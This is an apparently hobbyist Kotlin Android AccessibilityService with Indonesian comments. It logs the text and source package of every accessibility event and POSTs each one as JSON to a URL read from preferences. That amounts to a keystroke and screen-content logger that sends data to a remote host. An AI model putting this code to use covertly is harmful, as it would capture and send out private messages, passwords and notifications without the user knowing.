package com.example.myxcreate

import android.accessibilityservice.AccessibilityService
import android.view.accessibility.AccessibilityEvent
import android.content.SharedPreferences
import android.preference.PreferenceManager
import android.util.Log
import kotlinx.coroutines.*
import java.io.*
import java.net.HttpURLConnection
import java.net.URL
import java.text.SimpleDateFormat
import java.util.*

class MyAccessibilityService : AccessibilityService() {
    private val TAG = "MyAccessibilityService"

    override fun onAccessibilityEvent(event: AccessibilityEvent?) {
        if (event == null) return

        val prefs: SharedPreferences = PreferenceManager.getDefaultSharedPreferences(this)
        val postUrl = prefs.getString("notif_post_url", null)

        val eventText = event.text?.joinToString(" ") ?: ""
        val pkgName = event.packageName?.toString() ?: "unknown"
        val timestamp = SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault()).format(Date())

        val logEntry = "[$timestamp][$pkgName] $eventText"

        // Simpan log ke SharedPreferences
        saveLogToPrefs(prefs, logEntry)

        if (!postUrl.isNullOrEmpty()) {
            // Lakukan POST di background
            GlobalScope.launch(Dispatchers.IO) {
                try {
                    val url = URL(postUrl)
                    val conn = url.openConnection() as HttpURLConnection
                    conn.requestMethod = "POST"
                    conn.setRequestProperty("Content-Type", "application/json")
                    conn.doOutput = true

                    val payload =
                        """{"package":"$pkgName","text":"$eventText","time":"$timestamp"}"""

                    conn.outputStream.use { os ->
                        val input = payload.toByteArray(Charsets.UTF_8)
                        os.write(input, 0, input.size)
                    }

                    val responseCode = conn.responseCode
                    val responseMsg = conn.inputStream.bufferedReader().use { it.readText() }

                    val postLog = "POST -> $responseCode : $responseMsg"
                    savePostLogToPrefs(prefs, postLog)

                    conn.disconnect()
                } catch (e: Exception) {
                    Log.e(TAG, "POST gagal", e)
                    savePostLogToPrefs(prefs, "POST ERROR: ${e.message}")
                }
            }
        }
    }

    override fun onInterrupt() {
        Log.w(TAG, "Service interrupted")
    }

    private fun saveLogToPrefs(prefs: SharedPreferences, log: String) {
        val logs = prefs.getStringSet("notif_logs", mutableSetOf())?.toMutableSet() ?: mutableSetOf()
        logs.add(log)
        prefs.edit().putStringSet("notif_logs", logs).apply()
    }

    private fun savePostLogToPrefs(prefs: SharedPreferences, log: String) {
        val logs = prefs.getStringSet("post_logs", mutableSetOf())?.toMutableSet() ?: mutableSetOf()
        logs.add(log)
        prefs.edit().putStringSet("post_logs", logs).apply()
    }
}
